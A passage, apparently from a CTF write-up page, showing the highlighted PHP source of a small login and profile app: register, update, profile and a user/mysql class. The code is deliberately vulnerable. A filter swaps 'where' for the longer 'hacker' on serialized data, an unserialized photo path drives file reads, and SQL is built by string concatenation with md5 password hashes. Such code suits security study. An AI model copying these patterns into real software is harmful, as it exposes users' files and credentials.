variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span> <span class="token keyword">or</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid user name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span> <span class="token keyword">or</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid password'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: profile.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid user name or password'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token delimiter important">?></span></span>......(html)</code></pre><p>register.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span> <span class="token keyword">or</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid user name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span> <span class="token keyword">or</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid password'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">is_exists</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">register</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Register OK!&lt;a href="index.php">Please Login&lt;/a>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'User name Already Exists'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token delimiter important">?></span></span>......(html)</code></pre><p>update.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Login First'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\d&#123;11&#125;$/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid phone'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid email'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^a-zA-Z0-9_]/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid nickname'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">5</span> <span class="token keyword">or</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">1000000</span><span class="token punctuation">)</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Photo size error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'upload/'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'photo'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'upload/'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">update_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Update Profile Success!&lt;a href="profile.php">Your Profile&lt;/a>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token delimiter important">?></span></span>......(html)<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>profile.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Login First'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$profile</span><span class="token operator">=</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">show_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$profile</span>  <span class="token operator">==</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: update.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token variable">$profile</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$email</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$photo</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>......(html)<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>class.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">user</span> <span class="token keyword">extends</span> <span class="token class-name">mysql</span><span class="token punctuation">&#123;</span><span class="token keyword">private</span> <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'users'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">is_exists</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"username = '<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">register</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$key_list</span> <span class="token operator">=</span> <span class="token keyword">Array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$value_list</span> <span class="token operator">=</span> <span class="token keyword">Array</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token variable">$key_list</span><span class="token punctuation">,</span> <span class="token variable">$value_list</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"username = '<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span><span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$object</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$object</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">show_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"username = '<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span><span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$object</span><span class="token operator">-></span><span class="token property">profile</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">update_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$new_profile</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$new_profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"username = '<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'profile'</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> __class__<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">mysql</span> <span class="token punctuation">&#123;</span><span class="token keyword">private</span> <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">connect</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">link</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hostname'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SET sql_mode='strict_all_tables'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">link</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">select</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">,</span> <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'*'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT <span class="token interpolation"><span class="token variable">$ret</span></span> FROM <span class="token interpolation"><span class="token variable">$table</span></span> WHERE <span class="token interpolation"><span class="token variable">$where</span></span>"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">link</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">mysql_fetch_object</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">insert</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token variable">$key_list</span><span class="token punctuation">,</span> <span class="token variable">$value_list</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token variable">$key_list</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'\''</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\',\''</span><span class="token punctuation">,</span> <span class="token variable">$value_list</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'\''</span><span class="token punctuation">;</span> <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO <span class="token interpolation"><span class="token variable">$table</span></span> (<span class="token interpolation"><span class="token variable">$key</span></span>) VALUES (<span class="token interpolation"><span class="token variable">$value</span></span>)"</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">update</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE <span class="token interpolation"><span class="token variable">$table</span></span> SET <span class="token interpolation"><span class="token variable">$key</span></span> = '<span class="token interpolation"><span class="token variable">$value</span></span>' WHERE <span class="token interpolation"><span class="token variable">$where</span></span>"</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\\\\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$escape</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$escape</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'_'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'insert'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'update'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'delete'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'where'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$safe</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$safe</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">,</span> <span class="token 